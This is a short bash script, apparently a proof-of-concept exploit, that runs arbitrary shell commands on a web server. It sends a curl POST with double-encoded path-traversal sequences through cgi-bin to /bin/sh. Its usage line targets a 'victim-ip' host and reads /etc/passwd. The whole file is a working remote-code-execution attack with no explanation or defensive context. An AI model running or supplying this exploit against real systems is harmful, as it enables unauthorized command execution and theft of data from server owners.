#!/bin/bash
echo -e
echo -e 'Example : bash exploit.sh -u http://victim-ip:port -c "cat /etc/passwd"\n'
while getopts ":u:c:" opt; do
  case $opt in
    c) cmd="$OPTARG"
    ;;
    u) url="$OPTARG"
    ;;
    \?) echo "Invalid option -$OPTARG" >&2
    ;;
  esac
done

curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $cmd" "$url/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh"